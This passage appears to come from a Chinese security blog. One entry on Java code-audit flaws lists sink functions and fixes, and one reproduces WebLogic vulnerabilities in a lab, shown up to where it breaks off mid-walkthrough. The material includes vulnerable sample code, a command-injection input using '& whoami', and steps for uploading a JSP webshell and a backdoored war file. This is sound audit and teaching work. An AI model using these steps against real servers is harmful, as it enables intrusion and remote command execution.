class="selector-tag">org</span><span class="selector-class">.xml</span><span class="selector-class">.sax</span><span class="selector-class">.XMLReader</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXSource</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.TransformerFactory</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.transform</span><span class="selector-class">.sax</span><span class="selector-class">.SAXTransformerFactory</span> </span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.validation</span><span class="selector-class">.SchemaFactory</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.bind</span><span class="selector-class">.Unmarshaller</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span><span class="selector-class">.xpath</span><span class="selector-class">.XPathEx</span></span><br></pre></td></tr></table></figure>

<h5 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h5><ul>
<li>使用白名单检验，例如上面的代码增加正则匹配</li>
</ul>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if (!Pattern.matches(<span class="string">"[_a-bA-B0-9]+"</span>, user.getUserId()))</span><br><span class="line">if (!Pattern.matches(<span class="string">"[_a-bA-B0-9]+"</span>, user.getDescription()))</span><br></pre></td></tr></table></figure>

<ul>
<li>使用安全的XML库，使用dom4j来构建XML,dom4j会对文本数据域进行xml编码。</li>
</ul>
<h4 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h4><h5 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h5><p>代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。</p>
<p>java的SSRF利用方式比较局限:</p>
<ul>
<li>利用file协议任意文件读取。</li>
<li>利用http协议端口探测</li>
</ul>
<p><strong>支持的一些协议:</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">file</span> <span class="keyword">ftp</span> mailto <span class="keyword">http</span> <span class="keyword">https</span> jar netdoc</span><br></pre></td></tr></table></figure>

<p>举例:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">String url = request.get<span class="constructor">Parameter(<span class="string">"url"</span>)</span>;</span><br><span class="line">         String htmlContent;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             URL u = <span class="keyword">new</span> <span class="constructor">URL(<span class="params">url</span>)</span>;</span><br><span class="line">             <span class="comment">//URL对象用openconnection()获得openConnection类对象。</span></span><br><span class="line">             URLConnection urlConnection = u.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br><span class="line">             HttpURLConnection httpUrl = (HttpURLConnection) urlConnection;</span><br><span class="line">             BufferedReader base = <span class="keyword">new</span> <span class="constructor">BufferedReader(<span class="params">new</span> InputStreamReader(<span class="params">httpUrl</span>.<span class="params">getInputStream</span>()</span>, <span class="string">"UTF-8"</span>));</span><br><span class="line">             <span class="comment">//用inputStream获取字节流然后使用InputStreamReader转化为字符流。</span></span><br><span class="line">             StringBuffer html = <span class="keyword">new</span> <span class="constructor">StringBuffer()</span>;</span><br><span class="line">             <span class="keyword">while</span> ((htmlContent = base.read<span class="constructor">Line()</span>) != null) &#123;</span><br><span class="line">                 html.append(htmlContent);</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure>

<p>漏洞代码四种情况</p>
<ul>
<li>Request</li>
</ul>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Request</span>.<span class="keyword">Get</span>(url).<span class="keyword">execute</span>()</span><br></pre></td></tr></table></figure>

<ul>
<li>openStream</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">URL u;</span><br><span class="line"><span class="built_in">int</span> length;</span><br><span class="line">byte<span class="literal">[]</span> <span class="built_in">bytes</span> = <span class="keyword">new</span> byte<span class="literal">[<span class="number">1024</span>]</span>;</span><br><span class="line">u = <span class="keyword">new</span> <span class="constructor">URL(<span class="params">url</span>)</span>;</span><br><span class="line">inputStream = u.<span class="keyword">open</span><span class="constructor">Stream()</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>HttpClient</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">String url = <span class="string">"http://127.0.0.1"</span>;</span><br><span class="line">CloseableHttpClient client = <span class="module-access"><span class="module"><span class="identifier">HttpClients</span>.</span></span>create<span class="constructor">Default()</span>;</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> <span class="constructor">HttpGet(<span class="params">url</span>)</span>;</span><br><span class="line">HttpResponse httpResponse;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 该行代码发起网络请求</span></span><br><span class="line">    httpResponse = client.execute(httpGet);</span><br></pre></td></tr></table></figure>

<ul>
<li>URLConnection和HttpURLConnection</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">URLConnection urlConnection = url.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br><span class="line">HttpURLConnection urlConnection = url.<span class="keyword">open</span><span class="constructor">Connection()</span>;</span><br></pre></td></tr></table></figure>

<h5 id="审计方法-3"><a href="#审计方法-3" class="headerlink" title="审计方法"></a>审计方法</h5><p>只要是能够对外发起网络请求的地方，就有可能会出现SSRF漏洞。重点查找以下函数。</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpClient</span>.</span></span>execute</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpClient</span>.</span></span>executeMethod</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpURLConnection</span>.</span></span>connect</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">HttpURLConnection</span>.</span></span>getInputStream</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">URL</span>.</span></span>openStream</span><br></pre></td></tr></table></figure>

<ul>
<li><code>new URL()</code>：构造一个url对象</li>
<li><code>openConnection()</code>:创建一个实例URLConncetion.</li>
<li><code>getInputStream()</code>：获取URL的字节流</li>
</ul>
<h5 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h5><ol>
<li>取URL的Host</li>
<li>取Host的IP</li>
<li>判断是否是内网IP，是内网IP直接return，不再往下执行</li>
<li>请求URL</li>
<li>如果有跳转，取出跳转URL，执行第1步</li>
<li>当判断完成最后会去请求URL </li>
</ol>
<h4 id="任意文件操作类漏洞"><a href="#任意文件操作类漏洞" class="headerlink" title="任意文件操作类漏洞"></a>任意文件操作类漏洞</h4><h5 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h5><p>​    常见的一些java文件操作类的漏洞:任意文件的读取、下载、删除、修改，这类漏洞的成因基本相同，都是因为程序没有对文件和目录的权限进行严格控制，或者说程序没有验证请求的资源文件是否合法导致的。</p>
<p>举例:</p>
<p><strong>任意文件读取</strong></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">@GET</span><br><span class="line">@<span class="constructor">Path(<span class="string">"/images/&#123;image&#125;"</span>)</span></span><br><span class="line">@<span class="constructor">Produces(<span class="string">"images/*"</span>)</span></span><br><span class="line">public Response get<span class="constructor">Image(@<span class="params">javax</span>.<span class="params">ws</span>.<span class="params">rs</span>.PathParam(<span class="string">"image"</span>)</span> String image) &#123;</span><br><span class="line">    File file = <span class="keyword">new</span> <span class="constructor">File(<span class="string">"resources/images/"</span>, <span class="params">image</span>)</span>; <span class="comment">//Weak point</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file.exists<span class="literal">()</span>) &#123;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Response</span>.</span></span>status(Status.NOT_FOUND).build<span class="literal">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Response</span>.</span></span>ok<span class="literal">()</span>.entity(<span class="keyword">new</span> <span class="constructor">FileInputStream(<span class="params">file</span>)</span>).build<span class="literal">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">def get<span class="constructor">WordList(<span class="params">value</span>:String)</span> = Action &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="module-access"><span class="module"><span class="identifier">Files</span>.</span></span>exists(<span class="module-access"><span class="module"><span class="identifier">Paths</span>.</span></span>get(<span class="string">"public/lists/"</span> + value))) &#123;</span><br><span class="line">    <span class="constructor">NotFound(<span class="string">"File not found"</span>)</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">val</span> result = <span class="module-access"><span class="module"><span class="identifier">Source</span>.</span></span>from<span class="constructor">File(<span class="string">"public/lists/"</span> + <span class="params">value</span>)</span>.get<span class="constructor">Lines()</span>.mkString <span class="comment">// Weak point</span></span><br><span class="line">    <span class="constructor">Ok(<span class="params">result</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>任意文件写入</strong></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(getExternalFilesDir(TARGET_TYPE), filename);</span><br><span class="line">fos = <span class="keyword">new</span> FileOutputStream(<span class="keyword">file</span>);</span><br><span class="line">fos.<span class="keyword">write</span>(confidentialData.getBytes());</span><br><span class="line">fos.flush();</span><br></pre></td></tr></table></figure>

<h5 id="审计方法-4"><a href="#审计方法-4" class="headerlink" title="审计方法"></a>审计方法</h5><p>全局搜索关键字或者方法</p>
<ul>
<li>FileInputStream</li>
<li>getPath</li>
<li>getAbsolutePath</li>
</ul>
<p>排查程序的安全策略配置文件，查找permission Java.io.FilePermission，<strong>查看IO方案是否只对程序的绝对路径赋予读写权限。</strong></p>
<h5 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h5><ul>
<li>配置全局安全策略</li>
<li>使用File.getCanonicalPath()方法，该方法会对所有别名、快捷方式以及符号链接进行一致 地解析。特殊的文件名，例如“..”会被移除。</li>
</ul>
<h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><h5 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h5><p>服务端没有针对执行命令的函数进行过滤，导致攻击者可以提交恶意构造语句。java中常见如：<code>Runtime.exec() Process ProcessBuilder.start</code></p>
<h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><p>Java中的命令执行离不开调用反射的机制，在实际的场景往往离不开反序列化的利用。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirList</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">String</span> dir = System.getProperty(“dir”);</span><br><span class="line">        <span class="built_in">Process</span> <span class="built_in">process</span> = null;</span><br><span class="line">        InputStream istream = null;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">process</span> = Runtime.getRuntime().exec(<span class="string">"cmd.exe /c dir"</span> + dir);</span><br><span class="line">            <span class="keyword">int</span> result = <span class="built_in">process</span>.waitFor();</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"process error: "</span> + result);</span><br><span class="line">            &#125;</span><br><span class="line">            istream = (result == <span class="number">0</span>) ? <span class="built_in">process</span>.getInputStream() : <span class="built_in">process</span>.getErrorStream();</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="built_in">buffer</span> = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> (istream.<span class="built_in">read</span>(<span class="built_in">buffer</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">                System.out.<span class="built_in">print</span>(<span class="keyword">new</span> <span class="keyword">String</span>(<span class="built_in">buffer</span>, “gb2312”));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            <span class="keyword">if</span> (istream != null) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    istream.<span class="built_in">close</span>();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">process</span> != null) &#123;</span><br><span class="line">                <span class="built_in">process</span>.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码利用<code>Runtime.exec()</code>方法调用dir命令。</p>
<p>攻击者可以利用&amp;符号执行多条命令，例如</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">java -Ddir=<span class="string">"..\\ &amp; whoami</span></span><br></pre></td></tr></table></figure>

<h5 id="审计方法-5"><a href="#审计方法-5" class="headerlink" title="审计方法"></a>审计方法</h5><p>RCE出现的原因和场景很多，以后慢慢学习~</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">服务端直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">服务端不直接存在可执行函数（exec()等），且对传入的参数过滤不严格导致 RCE 漏洞</span><br><span class="line"></span><br><span class="line">由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、<span class="keyword">JST+EL等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">由java后端模板引擎注入导致的 </span>RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf等</span><br><span class="line"></span><br><span class="line">由<span class="keyword">java一些脚本语言引起的 </span>RCE 漏洞，常见的如：Groovy、<span class="keyword">JavascriptEngine等</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">由第三方开源组件引起的 </span>RCE 漏洞，常见的如：Fastjson、<span class="keyword">Shiro、Xstream、Struts2、weblogic等</span></span><br></pre></td></tr></table></figure>

<p>审计的时候可以重点寻找：</p>
<ul>
<li><p>Runtime.exec()</p>
</li>
<li><p>Process</p>
</li>
<li><p>ProcessBuilder.start()</p>
</li>
</ul>
<h5 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h5><ul>
<li>正则表达式匹配用户输入</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="module-access"><span class="module"><span class="identifier">Pattern</span>.</span></span>matches(<span class="string">"[0-9A-Za-z@.]+"</span>, dir)) &#123;</span><br></pre></td></tr></table></figure>

<h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h5><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
<h5 id="审计方法-6"><a href="#审计方法-6" class="headerlink" title="审计方法"></a>审计方法</h5><p>反序列化操作常常出现在<strong>导入模版文件、网络通信、数据传输、日志格式化存储或者数据库存储</strong>等业务功能处,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控。</p>
<ul>
<li>ObjectInputStream.readObject</li>
<li>ObjectInputStream.readUnshared</li>
<li>XMLDecoder.readObject</li>
<li>XStream.fromXML</li>
<li>第三方jar包:ObjectMapper.readValue,jackson中的JSON.parseObject,fastjson中的api</li>
</ul>
<h5 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h5><ul>
<li>升级服务端所依赖的可能被利用的jar包，包括JDK。</li>
<li>在执行反序列前对InputStream对象进行检查过滤</li>
</ul>
<h4 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h4><h5 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h5><p>​    <strong>中间件</strong>是提供系统软件和应用软件之间连接的软件，它将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</p>
<p>java常见的中间件:</p>
<p><img src="/2021/06/18/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<h4 id="审计方法-7"><a href="#审计方法-7" class="headerlink" title="审计方法"></a>审计方法</h4><p>直接打开pom.xml文件查看其 使用的中间件及其版本，然后到漏洞库里找漏洞即可。</p>
<img src="/2021/06/18/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/QQ截图20210127114728.png" style="zoom: 50%;">

<h5 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h5><p>及时更新项目使用的java中间件的版本。</p>
<h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><h5 id="成因-8"><a href="#成因-8" class="headerlink" title="成因"></a>成因</h5><p>​    常见的业务逻辑漏洞主要是越权，分为平行越权和垂直越权。在javaweb的各个功能点中都可能存在越权漏洞。</p>
<p>主要原因还是因为程序没有对当前用户的权限进行严格控制，或者是后台没有判断当前用户id。</p>
<h5 id="审计方法-8"><a href="#审计方法-8" class="headerlink" title="审计方法"></a>审计方法</h5><p>在每个<code>request.getParameter(&quot;userid&quot;);</code>之后查看是否有检验当前用户与要进行增删改查的用户。</p>
<h5 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h5><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p>
<h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p>java中存在的安全问题还有很多，比如ldap注入、jndi注入、rmi反序列化等等会在后面的文章单独拿出来说，更多的java安全漏洞可以参考先知的java安全手书：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3372</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3460</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3416</span></span><br><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">3358</span></span><br></pre></td></tr></table></figure>

<p>最后推荐一个自动化搜索java敏感函数的脚本:<a href="https://github.com/Cryin/JavaID" target="_blank" rel="noopener">Cryin/JavaID: java source code static code analysis and danger function identify prog (github.com)</a></p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/jinqi520/p/10083441.html" target="_blank" rel="noopener">java代码审计中的一些常见漏洞及其特征函数 - 京亟QAQ - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/" target="_blank" rel="noopener">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/</a></p>
<p><a href="https://xz.aliyun.com/t/7945#toc-13" target="_blank" rel="noopener">java代码审计 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://xz.aliyun.com/t/1633#toc-11" target="_blank" rel="noopener">JAVA代码审计的一些Tips(附脚本) - 先知社区 (aliyun.com)</a></p>
<p><a href="http://drops.xmd5.com/static/drops/web-16609.html" target="_blank" rel="noopener">JAVA安全之JAVA服务器安全漫谈 | WooYun知识库 (xmd5.com)</a></p>
<p><a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF - 先知社区 (aliyun.com)</a></p>
<p><a href="https://www.freebuf.com/articles/web/253139.html" target="_blank" rel="noopener">看一名Java开发人员以红队思维五分钟审计一套代码（续） - FreeBuf网络安全行业门户</a></p>
]]></content>
  </entry>
  <entry>
    <title>Weblogic中间件漏洞</title>
    <url>/2020/04/03/weblogic-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="WebLogic中间件漏洞复现"><a href="#WebLogic中间件漏洞复现" class="headerlink" title="WebLogic中间件漏洞复现"></a>WebLogic中间件漏洞复现</h2><h4 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
<h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>使用vulhub实验环境，启动实验环境，访问靶机，抓包，修改数据包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png!small" alt="img"></a></p>
<p>Kali启动监听。</p>
<p>发送数据包成功后，拿到shell。</p>
<p><a href="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png!small" alt="img"></a></p>
<p><strong>3、漏洞修复</strong></p>
<p>1）升级Oracle 10月份补丁。</p>
<p>2）对访问wls-wsat的资源进行访问控制。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p><strong>2、 漏洞复现</strong></p>
<p>使用vulhub实验环境，启动环境。</p>
<p>访问<a href="http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png!small" alt="img"></a></p>
<p>用burp抓包，修改请求。</p>
<p><a href="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png!small" alt="img"></a></p>
<p>启动nc监听2222端口。</p>
<p><a href="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png!small" alt="img"></a></p>
<p>拿到shell。</p>
<h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h5><p>方法一：</p>
<p>以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了；</p>
<p>方法二：</p>
<p>1）删除uddiexplorer文件夹</p>
<p>2）限制uddiexplorer应用只能内网访问</p>
<p>方法三：（常用）</p>
<p>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下：</p>
<p>1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</p>
<p>2）将weblogic安装目录下的server/lib/uddiexplorer.war下载</p>
<p>3）用winrar等工具打开uddiexplorer.war</p>
<p>4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</p>
<p>5）保存后上传回服务端替换原先的uddiexplorer.war</p>
<p>6）对于多台主机组成的集群，针对每台主机都要做这样的操作</p>
<p>7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用–停server–停控制台–启控制台–启server–启应用）</p>
<h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p>
<h5 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/ws_utc/config.do。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/config.do。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png!small" alt="img"></a></p>
<p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。</p>
<p>然后点击安全 -&gt; 增加，然后上传 webshell ，这里我上传一个 jsp 大马。</p>
<p><a href="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png!small" alt="img"></a></p>
<p>上传后，查看返回的数据包，其中有时间戳：</p>
<p><a href="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png!small" alt="img"></a></p>
<p>可以看到时间戳为1543145154632。</p>
<p>访问<a href="http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。</a></p>
<p>可以进行文件管理、文件上传、系统命令执行等。</p>
<p><a href="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png!small" alt="img"></a></p>
<p>尝试以下执行系统命令。</p>
<p><a href="https://image.3001.net/images/20181216/1544955446_5c16263615970.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955446_5c16263615970.png!small" alt="img"></a></p>
<p>命令执行成功。</p>
<p><strong>3.漏洞修复</strong></p>
<p>方案1：</p>
<p>使用Oracle官方通告中的补丁链接：</p>
<p><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></p>
<p><a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1" target="_blank" rel="noopener">https://support.oracle.com/rs?type=doc&amp;id=2394520.1</a></p>
<p>方案2:</p>
<p>1）进入Weblogic Server管理控制台；</p>
<p>2）domain设置中，启用”生产模式”。</p>
<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理：-1"><a href="#1-漏洞原理：-1" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p>
<h5 id="2-漏洞复现-2"><a href="#2-漏洞复现-2" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/console" target="_blank" rel="noopener">http://192.168.139.129:7001/console</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png!small" alt="img"></a></p>
<p>使用弱口令登陆至后台。</p>
<p>点击锁定并编辑。</p>
<p><a href="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png!small" alt="img"></a></p>
<p>选择部署，进一步点击右边的安装。</p>
